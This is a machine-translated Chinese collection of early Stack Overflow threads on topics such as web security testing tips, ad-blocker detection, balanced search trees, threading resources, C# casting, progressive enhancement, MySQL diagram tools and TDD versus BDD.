*   在您当前在查询参数中使用简单整数行 ID 的任何地方使用长随机难以猜测的标识符，并确保用户 X 不能仅通过猜测这些标识符来查看用户 Y 的数据。

*   测试应用程序中的每个查询处理程序，以确保它们仅在提供有效的登录会话 cookie 时才起作用。

*   打开 Web 堆栈中的 XSRF 保护，这将在所有呈现的表单上生成隐藏的表单令牌参数，以防止攻击者创建恶意链接，这些链接将为毫无戒心的用户提交表单。

*   使用 bcrypt --- 仅此而已 --- 来存储散列密码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-08-05T17:50:49.243

我不是安全专家，但我认为在测试安全性之前你应该知道的最重要的事实是你试图保护的东西。只有知道要保护什么，才能对安全措施进行适当的分析，然后才能开始测试那些已实施的措施。

很抽象，我知道。但是，我认为这应该是每一次安全审计的第一步。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-08-05T17:19:03.893

我不是敏捷开发方面的专家，但我认为将一些基本的自动化渗透测试软件集成到您的构建周期中将是一个好的开始。我已经看到了几个可以进行基本测试并且非常适合自动化的软件包。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-08-18T02:40:37.040

[单元测试](https://stackoverflow.com/questions/1383/what-is-unit-testing)、[防御编程](http://en.wikipedia.org/wiki/Defensive_programming)和大量日志

**单元测试**

确保您尽早进行单元测试（例如，密码应该在发送前加密，SSL 隧道正在工作等）。这将防止您的程序员意外地使程序不安全。

**防御编程**

我个人称之为偏执编程，但维基百科永远不会错（*讽​​刺*）。基本上，您将测试添加到检查所有输入的函数中：

*   用户的 cookie 是否有效？
*   他现在还登录吗？
*   函数的参数是否受到 SQL 注入的保护？（即使你知道输入是由你自己的函数生成的，你还是会测试）

**日志记录**

疯狂地记录一切。删除日志然后添加它们更容易。用户已登录？记录下来。用户发现了 404？记录下来。管理员编辑/删除了帖子？记录下来。有人能够访问受限页面吗？记录下来。

如果您的日志文件在开发阶段达到 15+ Mb，请不要感到惊讶。在测试期间，您可以决定要删除哪些日志。如果需要，您可以添加一个标志来决定何时记录某个事件。

# browser - 如何判断 Web 客户端是否阻止广告？

> ID：2472
> 
> 赞同：16
> 
> 时间：2008-08-05T15:30:42.617
> 
> 标签：browser, analytics

记录访问我的网站并设置浏览器阻止广告的访问者数量的最佳方法是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-08-05T15:34:18.583

由于像 AdBlock 这样的程序实际上从不请求广告，因此您必须查看服务器日志以查看同一用户是否访问了网页但没有访问广告。这是假设广告在同一台服务器上。

如果您的广告在单独的服务器上，那么我建议您不可能这样做。

阻止用户阻止广告的最佳方法是使用由服务器生成并在您的 html 中投放的内嵌文本广告。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-08-05T15:37:34.520

将用户 ID 添加到广告请求中：

```
<img src="./ads/viagra.jpg?{user.id}"/> 
```

这样您就可以检查哪些用户看到了哪些广告。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-05T15:37:36.063

您需要考虑阻止广告的不同方式。首先要查看的是它们是否正在运行 noscript，因此您可以添加一个脚本来检查它。

接下来就是看他们是否挡住了flash，一个小电影就应该这么做。

如果您查看 adblock 站点，就会发现它是如何阻止的：
[元素隐藏是如何工作的？](http://adblockplus.org/en/faq_internal#elemhide)

如果您进一步向下看该页面，您会发现传统的 chrome 探测将不起作用，因此您需要尝试解析更改后的 DOM。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-08-07T00:31:18.077

AdBlock 论坛[说](http://adblockplus.org/forum/viewtopic.php?t=2107&postdays=0&postorder=asc&start=60)这是用来检测 AdBlock 的。经过一些调整后，您可以使用它来收集一些统计信息。

```
setTimeout("detect_abp()", 10000);
var isFF = (navigator.userAgent.indexOf("Firefox") > -1) ? true : false,
    hasABP = false;

function detect_abp() {
  if(isFF) {
    if(Components.interfaces.nsIAdblockPlus != undefined) {
      hasABP = true;
    } else {
      var AbpImage = document.createElement("img");
      AbpImage.id = "abp_detector";
      AbpImage.src = "/textlink-ads.jpg";
      AbpImage.style.width = "0";
      AbpImage.style.height = "0";
      AbpImage.style.top = "-1000px";
      AbpImage.style.left = "-1000px";
      document.body.appendChild(AbpImage);
      hasABP = (document.getElementById("abp_detector").style.display == "none");

      var e = document.getElementsByTagName("iframe");
      for (var i = 0; i < e.length; i++) {
        if(e[i].clientHeight == 0) {
          hasABP = true;
        }
      }
      if(hasABP == true) {
        history.go(1);
        location = "http://www.tweaktown.com/supportus.html";
        window.location(location);
      }
    }
  }
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-08-05T15:32:21.660

我想您可以将广告打印与您网站上的页面浏览量（您可以从分析软件中获得）进行比较。

# data-structures - 用于快速插入大量节点的最佳自平衡 BST

> ID：2481
> 
> 赞同：11
> 
> 时间：2008-08-05T15:40:24.903
> 
> 标签：data-structures, language-agnostic, binary-search-tree

我已经能够`BST`通过几个来源找到关于几个 self-balancing 的详细信息，但是我没有找到任何好的描述来详细说明在不同情况下哪个最好使用（或者如果它真的无关紧要）。

我想要一个`BST`最适合存储超过一千万个节点的设备。节点的插入顺序基本上是随机的，我永远不需要删除节点，所以插入时间是唯一需要优化的东西。

我打算用它来存储以前访问过的游戏状态在一个益智游戏中，这样我就可以快速检查以前的配置是否已经遇到过。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-08-05T15:59:27.563

[对于插入繁重的应用，红黑](http://en.wikipedia.org/wiki/Red-black_tree)比 AVL 更好。如果您预见到相对统一的查找，那么红黑是要走的路。如果您预见到相对不平衡的查找，其中最近查看的元素更有可能再次被查看，您希望使用[splay trees](http://en.wikipedia.org/wiki/Splay_tree)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-29T00:10:46.930

为什么要使用 a `BST`？根据您的描述，如果不是更好的话，字典也可以正常工作。

使用 a 的唯一原因`BST`是如果您想按键顺序列出容器的内容。听起来您当然不想这样做，在这种情况下，请使用哈希表。`O(1)`插入和搜索，不用担心删除，还有什么更好的呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T15:50:05.120

`BST`我最熟悉的两个自平衡是 red-black 和`AVL`，所以我不能肯定是否有其他解决方案更好，但我记得，red-black 与 相比具有更快的插入和更慢的检索`AVL`。

因此，如果插入的优先级高于检索，那么红黑可能是更好的解决方案。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2009-02-01T12:49:56.797

> [哈希表有] O(1) 插入和搜索

我认为这是错误的。

首先，如果将键空间限制为有限，则可以将元素存储在数组中并进行 O(1) 线性扫描。或者您可以对数组进行随机排序，然后在 O(1) 预期时间内进行线性扫描。当东西是有限的时，东西很容易 O(1)。

因此，假设您的哈希表将存储任意位字符串；没关系，只要有一组无限的键，每个键都是有限的。然后您必须读取任何查询和插入输入的所有位，否则我将 y0 插入一个空哈希并查询 y1，其中 y0 和 y1 在您不查看的单个位位置不同。

但是假设密钥长度不是参数。如果您的插入和搜索需要 O(1)，特别是散列需要 O(1) 时间，这意味着您只能查看来自散列函数的有限输出（可能*只有*有限输出，授予）。

这意味着对于有限多个桶，必须有无限的字符串集，它们都具有相同的哈希值。假设我插入了很多，即 ω(1)，然后开始查询。这意味着您的哈希表必须依靠其他一些 O(1) 插入/搜索机制来回答我的查询。哪一个，为什么不直接使用它呢？

# multithreading - 有哪些学习线程编程的好资源？

> ID：2482
> 
> 赞同：35
> 
> 时间：2008-08-05T15:42:09.847
> 
> 标签：multithreading, language-agnostic, concurrency

随着桌面多核 CPU 的兴起，多线程技能将成为程序员的宝贵财富。你能为想要学习线程编程的程序员推荐一些好的资源（书籍、教程、网站等）吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-08-05T16:02:41.660

查看 Herb Sutter 的“[免费午餐结束”以及他关于](http://www.gotw.ca/publications/concurrency-ddj.htm)[有效并发](http://herbsutter.wordpress.com/2008/07/31/effective-concurrency-the-many-faces-of-deadlock/)的系列文章。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-08-18T21:51:01.947

Joseph Albahari 在这里写了一篇很好的 C# 线程概述：

[http://www.albahari.com/threading/](http://www.albahari.com/threading/)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-08-05T15:47:15.997

老实说，我自己从来没有读过它，但是我听说过很多人推荐的[Java 并发编程一本书。](https://rads.stackoverflow.com/amzn/click/com/0201310090)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-08-27T12:20:34.213

[http://www.yoda.arachsys.com/csharp/threads/](http://www.yoda.arachsys.com/csharp/threads/)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-10-09T12:56:05.513

[我在我的博客](http://www.justsoftwaresolutions.co.uk/blog/)上写了关于 C++ 中的多线程和并发的文章。我还在写一本关于 C++ 并发的书：[C++ Concurrency in Action](http://www.manning.com/williams/)。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-08-21T11:39:20.727

我已经阅读了 Brian Goetz 的（大部分）[Java Concurrency in Practice](http://www.javaconcurrencyinpractice.com/)，非常好。

很明显，本书贯穿了一个基于 Java 的主题（使用 Java 特定的线程、锁等实现），但几乎所有的原则都可以应用于其他语言。

作者的主页包含他撰写[的文章列表，其中一些包含与线程相关的内容。](http://www.briangoetz.com/pubs.html)也许从那里开始，如果你喜欢他的风格，买这本书。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-08-21T12:06:05.420

对于 C#（或一般的 .NET）并发编程的优秀指南和参考，我推荐 MSDN [What Every Dev Must Know About Multithreaded Apps](http://msdn.microsoft.com/msdnmag/issues/05/08/Concurrency/default.aspx)文章，作者是 MSDN 上的 Vance Morrison。它包含大量关于多线程开发的最佳实践信息和注意事项

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-09-22T02:22:31.633

我为并发文章、博客和项目维护了一个链接博客：

[http://concurrency.tumblr.com](http://concurrency.tumblr.com)

我通常每天发布一个或两个关于各种环境（Erlang、Java、Scala、.NET、C++、Ruby、Python 等）中各种主题（线程、参与者、锁定、并行编程）的链接。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-10-01T16:48:31.090

它是 Delphi 特有的，但没有理由将这个概念不适用于任何其他语言！

[多线程教程](http://www.eonclash.com/Tutorials/Multithreading/MartinHarvey1.1/ToC.html)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-08-05T15:48:57.413

[http://www.cilk.com/multicore-e-book/](http://www.cilk.com/multicore-e-book/)

这是对情况的一个很好的总体概述，如果您正在寻找教程和书籍，最好指定一种语言作为起点，这样您就可以弄乱一些代码。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-08-13T16:46:40.437

Erlang 编程语言提供了一种易于使用的并发编程风格。你可能永远不会真正使用 Erlang，但这些概念可以移植到其他语言。您可能想阅读*Programming Erlang: Software for a Concurrent World 一*书。

函数式编程的粉丝声称没有必要学习任何新东西。只需使用纯函数式语言，编译器或解释器就会自动并行化所有内容。因此，您可能想学习 Haskell、OCaml 或其他函数式语言。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-08-21T12:11:11.617

我不知道您到底在寻找什么，但是如果您正在做 WindowsForms 开发，那么下面的博客文章值得每一分钟阅读： [WinForms UI 线程调用：In-Depth Review of Invoke/BeginInvoke/InvokeRequred](http://weblogs.asp.net/justin_rogers/articles/126345.aspx)

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-08-21T20:46:58.087

我认为 Boost.Threads 是一个很棒的 C++ 并发库，特别是如果你只是想开始编写多线程应用程序。代码非常简洁易懂，而且下一个 C++ 标准可能会包含一个基于 Boost.Threads 的线程库（教程：[http](http://www.ddj.com/cpp/184401518) ://www.ddj.com/cpp/184401518 ）

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-08-27T12:12:34.357

如果您想尝试做一个简单任务的高度并行版本，或者查看真正的解决方案，您可能会比查看[Wide Finder](http://www.tbray.org/ongoing/When/200x/2007/09/20/Wide-Finder)项目做得更糟。基本上它是关于如何有效地对日志文件进行并行正则表达式匹配，但尝试添加尽可能少的代码。

参与者以多种不同的语言提交了解决方案，并发布了[性能结果](http://www.tbray.org/ongoing/When/200x/2007/10/30/WF-Results)。最初的项目现在已经完成，现在[宽取景器 2](http://www.tbray.org/ongoing/When/200x/2008/05/01/Wide-Finder-2)开始工作。

[CodingHorror](http://www.codinghorror.com/)[对宽查找器](http://www.codinghorror.com/blog/archives/001131.html)有一个很好的介绍。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-09-10T04:07:35.327

为了对该主题进行丰富、透彻的处理，并在计算机科学与实践之间取得良好的平衡，我推荐[《多处理器编程的艺术》](https://rads.stackoverflow.com/amzn/click/com/0123705916)。很多例子都是在面向对象的代码中，比如Java，其他语言也分散在各处。这仅取决于所涵盖的主题。我真正喜欢这本书的地方在于它讨论了如何在并发设计中实现通用算法。当然，还有很多！

对于一般概念和 pthread 的处理，我真的很喜欢[Programming with POSIX Threads](https://rads.stackoverflow.com/amzn/click/com/0201633922)。作为它的库和 API，它在 C 中。

对于 Windows 和 C# 开发人员，请查看[Joe Duffy 的博客](http://www.bluebytesoftware.com/blog/)。Joe 在 Microsoft 开发部门从事并行库、基础架构和编程模型的工作。他将于 2008 年 11 月出版一本名为[Concurrent Programming on Windows](http://www.bluebytesoftware.com/books/winconc/winconc_book_resources.html)（[亚马逊链接](https://rads.stackoverflow.com/amzn/click/com/032143482X)）的书。

此外，不要错过教父的博客：Herb Sutter's [Sutter's Mill](http://herbsutter.wordpress.com/)。他在 Dobb 博士的期刊等中提供了指向他所有文章的链接。单击他的[并发类别](http://herbsutter.wordpress.com/category/concurrency/)。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-09-26T12:21:04.737

CPU制造商网站有一些有趣的内容：

[http://developer.amd.com/documentation/articles/Pages/default.aspx#parallel](http://developer.amd.com/documentation/articles/Pages/default.aspx#parallel)

[http://software.intel.com/en-us/multi-core](http://software.intel.com/en-us/multi-core)

英特尔的开源线程库也有一些很好的参考：

[http://www.threadingbuildingblocks.org/](http://www.threadingbuildingblocks.org/)

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2009-02-05T02:40:11.770

如果您使用 C#，Gaston C. Hillar 的“C# 2008 和 2005 线程编程”一书 - Packt Publishing - [http://www.packtpub.com/beginners-guide-for-C-sharp-2008-and- 2005-threaded-programming/book](http://www.packtpub.com/beginners-guide-for-C-sharp-2008-and-2005-threaded-programming/book)，会帮助你。强烈推荐给 C# 程序员，因为您可以下载带有利用多核计算机的有趣示例的代码。这本书是一本很好的指南，有很多代码可以练习。它讲述了故事，同时解释了最困难的概念。

# c# - 铸造：（NewType）与对象作为NewType

> ID：2483
> 
> 赞同：90
> 
> 时间：2008-08-05T15:42:30.110
> 
> 标签：c#, .net

这两个演员阵容之间实际上有什么区别？

```
SomeClass sc = (SomeClass)SomeObject;
SomeClass sc2 = SomeObject as SomeClass; 
```

通常，它们不应该都是对指定类型的显式强制转换吗？

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2008-08-05T15:44:46.330

如果源类型不能转换为目标类型，前者会抛出异常。后者将导致 sc2 为空引用，但也不例外。

[编辑]

我最初的答案当然是最明显的区别，但正如 Eric Lippert[指出](http://blogs.msdn.com/ericlippert/archive/2009/10/08/what-s-the-difference-between-as-and-cast-operators.aspx)的那样，它不是唯一的。其他差异包括：

*   您不能使用“as”运算符强制转换为不接受“null”作为值的类型
*   您不能使用“as”来*转换*事物，例如将数字转换为不同的表示形式（例如，将浮点数转换为整数）。

最后，使用 'as' 与 cast 操作符，你也在说“我不确定这是否会成功”。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2008-08-05T16:15:38.437

另请注意，您只能将 as 关键字与引用类型或可为空的类型一起使用

IE：

```
double d = 5.34;
int i = d as int; 
```

不会编译

```
double d = 5.34;
int i = (int)d; 
```

将编译。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2008-09-16T19:21:21.680

当转换失败时，使用“as”进行类型转换当然要快得多，因为它避免了抛出异常的代价。

但是当演员成功时，它并没有更快。[http://www.codeproject.com/KB/cs/csharpcasts.aspx](http://www.codeproject.com/KB/cs/csharpcasts.aspx)上的图表具有误导性，因为它没有解释测量的内容。

底线是：

*   如果您希望演员表成功（即失败是例外），请使用演员表。

*   如果您不知道它是否会成功，请使用“as”运算符并测试结果是否为 null。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-11-07T23:46:49.017

这两种方法的区别在于第一个 ((SomeClass)obj) 可能会导致调用[类型转换器](http://msdn.microsoft.com/en-us/library/yy580hbd(VS.80).aspx)。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2010-10-28T09:21:44.530

好吧**，'as' 运算符“帮助”你把你的问题埋得更低**，因为当它被提供一个不兼容的实例时，它会返回 null，也许你会将它传递给一个方法，该方法将它传递给另一个方法，依此类推，最后你'会得到一个 NullReferenceException ，这将使您的调试更加困难。

不要滥用它。在 99% 的情况下，直接转换运算符更好。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-08-05T17:46:00.970

这是记住每个人遵循的过程的好方法，我在尝试决定哪个更适合我的情况时使用。

```
DateTime i = (DateTime)value;
// is like doing
DateTime i = value is DateTime ? value as DateTime : throw new Exception(...); 
```

接下来应该很容易猜到它的作用

```
DateTime i = value as DateTime; 
```

在第一种情况下，如果无法转换该值，则在第二种情况下，如果无法转换该值，则会引发异常，则将 i 设置为 null。

因此，在第一种情况下，如果在第二次强制转换中失败，则会进行硬停止，然后会进行软停止，稍后您可能会遇到 NullReferenceException。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-09-07T08:08:28.067

要扩展[Rytmis 的评论](https://stackoverflow.com/questions/2483/casting-newtype-vs-object-as-newtype#2487)，您不能对结构（值类型）使用*as*关键字，因为它们没有空值。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-09-18T11:10:03.153

所有这些都适用于引用类型，值类型不能使用`as`关键字，因为它们不能为空。

```
//if I know that SomeObject is an instance of SomeClass
SomeClass sc = (SomeClass) someObject;

//if SomeObject *might* be SomeClass
SomeClass sc2 = someObject as SomeClass; 
```

强制转换语法更快，但只有在成功时，失败才会慢得多。

最佳做法是`as`在您不知道类型时使用：

```
//we need to know what someObject is
SomeClass sc;
SomeOtherClass soc;

//use as to find the right type
if( ( sc = someObject as SomeClass ) != null ) 
{
    //do something with sc
}
else if ( ( soc = someObject as SomeOtherClass ) != null ) 
{
    //do something with soc
} 
```

但是，如果您绝对确定这`someObject`是`SomeClass`然后使用 cast 的一个实例。

在 .Net 2 或更高版本中，泛型意味着您很少需要引用类的无类型实例，因此后者不太常用。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-09-16T21:55:28.610

对于那些有 VB.NET 经验的人，(type) 与 DirectCast 相同，“as type”与 TryCast 相同。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-08-05T15:45:06.610

如果转换尝试失败，括号中的转换将引发异常。如果转换尝试失败，则“as”转换返回 null。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-08-05T15:49:34.310

他们会抛出不同的异常。

()：NullReferenceException
作为：InvalidCastException

这可以帮助调试。

“as”关键字尝试转换对象，如果转换失败，则返回 null。如果转换失败， () 转换运算符将立即抛出异常。

仅在您期望强制转换在非异常情况下失败的地方使用 C#“as”关键字。如果您指望强制转换成功并且没有准备好接收任何将失败的对象，则应使用 () 强制转换运算符，以便引发适当且有用的异常。

有关代码示例和进一步说明：http: [//blog.nerdbank.net/2008/06/when-not-to-use-c-keyword.html](http://blog.nerdbank.net/2008/06/when-not-to-use-c-keyword.html)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-08-08T12:00:01.940

这就像 Parse 和 TryParse 之间的区别。当您预计它可能会失败时，您使用 TryParse，但是当您有充分的保证它不会失败时，您使用 Parse。

# ajax - 什么是渐进增强？

> ID：2486
> 
> 赞同：24
> 
> 时间：2008-08-05T15:44:39.327
> 
> 标签：ajax, progressive-enhancement

Jeff 在谈到使用 JQuery 编写 stackoverflow 时提到了“渐进增强”的概念。

在快速谷歌之后，我发现了一些关于它的高级讨论。

任何人都可以推荐一个开始作为程序员的好地方。

具体来说，我一直在用 PHP 编写 Web 应用程序，并希望使用 YUI 来改进我正在编写的页面，但其中很多似乎都非常基于 JavaScript，大部分工作都是使用 JavaScript 完成的。对我来说，这似乎有点矫枉过正，因为在没有 Javascript 的情况下查看该网站可能会破坏大部分内容。

任何人都有一些开始使用这个想法的好地方，我并不关心语言。

理想情况下，我想看看您是如何首先开始创建静态 HTML，然后将 YUI（或任何 Ajax 框架）添加到其中以便获得更丰富的客户端的好处？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-08-05T15:51:11.873

正如你所说

> 对我来说，这似乎有点矫枉过正，因为在没有 Javascript 的情况下查看该网站可能会破坏大部分内容。

这不是渐进式增强。渐进增强是当网站在没有 JavaScript 或 CSS 的情况下完美运行，*然后*添加（分层）这些额外的技术/代码以增加网站的可用性和功能。

我能给出的最好的例子就是这个网站上的标签输入框。关闭 JavaScript 后，它仍然可以让您输入以空格分隔的标签。打开 JavaScript 后，您会看到一个下拉列表，其中包含以前条目的建议。

这是渐进式增强。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-08-05T16:05:29.020

另请参阅[Unobtrusive JavaScript](http://en.wikipedia.org/wiki/Unobtrusive_JavaScript)，它是构建渐进增强的基石。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-05T15:55:59.553

我在[NETTUTS](http://nettuts.com/)写了一篇关于创建使用渐进增强的投票的[教程](http://nettuts.com/javascript-ajax/creating-a-dynamic-poll-with-jquery-and-php/)。这个想法是使用 XHTML/CSS 和 PHP 创建一个功能性网站，然后使用 JavaScript 拦截表单等。（我使用了 jQuery）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-08-05T15:57:00.113

从另一个方向着手有时被称为优雅降级。当站点首先使用各种技术提供的增强功能构建时，通常需要这样做，然后对其进行修改以优雅地降级以适应那些技术不可用的浏览器。

当设计与旧浏览器（互联网术语中的古老术语）一起工作时，它也是优雅的降级，例如 IE 5.5、Netscape 等......

在我看来，优雅地降级应用程序需要做更多的工作。逐步增强它往往会更有效率；但是，有时需要使用现有的应用程序并使其在这些缺乏的环境中可访问。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-08-05T17:20:25.077

基本上，如果您的站点在关闭 JavaScript 的情况下仍然可以工作，那么您使用 JavaScript 添加的任何内容都可以视为渐进增强。

有些人可能认为这是不必要的，但很多人使用 NoScript 之类的插件进行浏览（或者，在他们的浏览器设置中简单地关闭 JavaScript）。此外，许多移动网络浏览器可能支持也可能不支持 JavaScript。因此，使用和不使用 JavaScript 完全测试您的网站始终是一个好主意。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-10-23T13:56:54.387

渐进增强是一种开发技术，它强调语义 HTML 的首要地位，然后测试浏览器*功能*并有条件地对 JavaScript 和/或 CSS 增强进行“分层”，以便为可以利用这些增强的浏览器提供支持。

关键之一是了解我们正在测试浏览器可以*做什么*，而不是浏览器*嗅探*。[Modernizr](http://modernizr.com/)是一个非常流行的浏览器功能测试套件。

渐进增强本质上是可访问的（第 508 节）；它规定符合法律条文*和*规则精神。

The Filament Group wrote the excellent "[Designing With Progressive Enhancement](http://filamentgroup.com/dwpe/)" book on the subject. (I am not affiliated with Filament Group, though they are so freaking smart I wish I were.)

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-09-19T04:37:17.223

这是一个如此重要的概念，令我感到难过的是，很少有 Web 开发人员理解它。

基本上，首先用普通的旧 HTML 构建站点/框架——结构元素、链接和表单。然后添加一些风格，然后添加闪亮的东西（Ajax 或你有什么）。

这不是很困难。就像[苍白马](https://stackoverflow.com/users/312/palehorse)说的，优雅的退化是更多的工作。

网站应该在任何用户代理中工作，看起来不一样（如果你的视力受损，甚至看起来不一样，但听起来），只是工作。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2010-07-21T17:22:11.343

渐进增强：

1.  纯 HTML/CSS 网站非常棒（*功能齐全且用户友好*）。
2.  添加 JavaScript 定义了一个新的水平。

# mysql - 自动生成数据库图 MySQL

> ID：2488
> 
> 赞同：357
> 
> 时间：2008-08-05T15:45:02.930
> 
> 标签：mysql, database, database-design, diagram

我厌倦了在每个项目开始时打开 Dia 并创建数据库图。有没有一种工具可以让我选择特定的表，然后基于 MySQL 数据库为我创建一个数据库图？最好它允许我在之后编辑图表，因为没有设置任何外键......

这是我在图表上描绘的（请原谅可怕的数据设计，我没有设计它。让我们关注图表概念，而不是它代表的实际数据；））：

![图表](../Images/38969393ad18cb34128d85921abacb54.png) [见全尺寸图](https://i.stack.imgur.com/ZnN2O.png)

* * *

## 回答 #1

> 赞同：434
> 
> 时间：2008-08-05T15:48:11.707

试试 MySQL Workbench，以前的 DBDesigner 4：

[http://dev.mysql.com/workbench/](http://dev.mysql.com/workbench/)

这有一个“逆向工程师数据库”模式：

数据库 -> 逆向工程师

[![在此处输入图像描述](../Images/f43669e6dcd6ac1fc4a96da5eb6b7a84.png)](https://i.stack.imgur.com/wcoq9.png)

* * *

## 回答 #2

> 赞同：67
> 
> 时间：2011-03-11T00:50:02.457

我最近开始使用[https://github.com/schemaspy/schemaspy](https://github.com/schemaspy/schemaspy)。我觉得它在可用性和简单性之间取得了很好的平衡。（GraphViz 现在是可选的）

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2008-09-22T01:48:14.693

在 Mac 上，[SQLEditor](http://www.malcolmhardie.com/sqleditor/)会做你想做的事。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-07-27T13:51:48.523

此[http://code.google.com/p/database-diagram/](http://code.google.com/p/database-diagram/)将对您的数据库进行反向工程。只需导出“仅结构”，然后将 SQL 粘贴到工具中。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2011-03-14T21:30:14.877

试试[MySQL Maestro](http://www.sqlmaestro.com/products/mysql/maestro/)。对我很有用。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-08-05T15:48:10.163

我相信[DB Designer](http://www.fabforce.net/dbdesigner4/)会做类似的事情。而且我认为他们甚至有免费版本。

*编辑* 没关系。迈克尔的链接要好得多。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2012-02-20T11:45:34.540

MySQL Workbench 的工作就像一个魅力。

我刚刚将数据库结构备份到 SQL 脚本，并在 MWB 5.2.37 for Windows 的“从 SQL 脚本创建 EER 模型”中使用它。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2014-07-11T10:31:29.493

在 MySql Workbench (6.0) 中，它可能会根据创建的表生成一个图表。为此，您应该访问工具栏，按**模型**并转发**从目录对象创建图表**并完成！

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2012-06-01T14:30:37.500

[UML 9.0 的视觉范式](http://www.visual-paradigm.com/product/vpuml/editions/community.jsp)

我曾经使用 mysql bench 非常棒，但是对于大型数据库（比如超过 300 个表）来说，效果不是很好，但是视觉范式反向数据库的效果要好得多

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2012-08-31T13:59:36.480

phpMyAdmin 拥有您正在寻找的东西（多年来）：它需要一点配置，但也给您带来额外的好处： [http ://www.phpmyadmin.net/documentation/#pmadb](http://www.phpmyadmin.net/documentation/#pmadb)

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2014-04-12T16:06:32.103

试试[Vertabelo](http://www.vertabelo.com/)吧！

它是一个支持逆向工程的在线数据库建模器。

只需创建免费的[Vertabelo](http://www.vertabelo.com/)帐户，[将现有数据库导入 Vertabelo](http://www.vertabelo.com/blog/reverse-engineering)，瞧——您的数据库在 Vertabelo 中！

它支持以下数据库：

*   PostgreSQL,
*   mysql,
*   甲骨文，
*   IBM DB2,
*   数据库，
*   微软 SQL 服务器。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-10-07T10:04:43.593

试试[SchemaBank](http://schemabank.com)。他们也支持逆向工程。

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2008-08-05T16:08:40.620

Workbench 中的“逆向工程师数据库”模式只是付费版的一部分，不是免费版。

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2014-09-09T10:13:10.433

这是一个从 MySQL 生成关系图的工具（目前在 Windows 上）。我在一个有 400 个表的数据库上使用了它。如果图表对于单个图表来说太大了，它会被分解成更小的图表。因此，您可能最终会得到多个图表，您可以通过右键单击在它们之间导航。这一切都在下面的链接中进行了解释。该工具是免费的（就像免费啤酒一样），作者自己在咨询任务中使用它，并让其他人使用它。 [http://www.scmlite.com/Quick%20overview](http://www.scmlite.com/Quick%20overview)

# unit-testing - TDD 和 BDD 之间的主要区别是什么？

> ID：2509
> 
> 赞同：133
> 
> 时间：2008-08-05T15:58:08.473
> 
> 标签：unit-testing, tdd, bdd

过去几年，测试驱动开发在 .NET 社区中风靡一时。最近，我在 ALT.NET 社区中听到关于 BDD 的抱怨。它是什么？它与 TDD 有何不同？

* * *

## 回答 #1

> 赞同：105
> 
> 时间：2008-08-05T16:36:53.840

我理解 BDD 更多的是关于**规范**而不是**测试**。它链接到领域驱动设计（你不喜欢这些 *DD 首字母缩略词吗？）。

它与编写用户故事的某种方式相关联，包括高级测试。[汤姆十 Thij](http://tomtenthij.nl/2008/1/25/rspec-plain-text-story-runner-on-a-fresh-rails-app)的一个例子：

```
Story: User logging in
  As a user
  I want to login with my details
  So that I can get access to the site

Scenario: User uses wrong password

  Given a username 'jdoe'
  And a password 'letmein'

  When the user logs in with username and password

  Then the login form should be shown again 
```

（在他的文章中，Tom 继续在 Ruby 中直接执行这个测试规范。）

BDD 的教皇是[Dan North](http://dannorth.net/)。您会在他的[介绍 BDD](http://dannorth.net/introducing-bdd)文章中找到很好的介绍。

